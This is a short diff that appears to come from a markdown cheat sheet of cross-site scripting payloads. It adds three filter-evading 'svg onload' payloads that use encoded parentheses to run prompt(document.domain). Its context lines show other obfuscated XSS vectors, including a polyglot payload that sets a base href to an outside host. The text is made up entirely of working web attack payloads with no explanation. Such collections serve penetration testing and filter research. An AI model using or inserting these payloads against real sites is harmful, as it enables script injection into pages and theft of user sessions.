@@ -193,6 +193,9 @@
   <sVg/onfake="x=y"oNload=;1^(co\u006efirm)``^1//
   <Svg Only=1 OnLoad=confirm(1)>
   JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
+  "><svg onload=prompt%26%230000000040document.domain)>
+  "><svg onload=prompt&#0000000040document.domain)>
+  "><svg onload=prompt%26%23x000000028;document.domain)>
   ```
 </details>
 
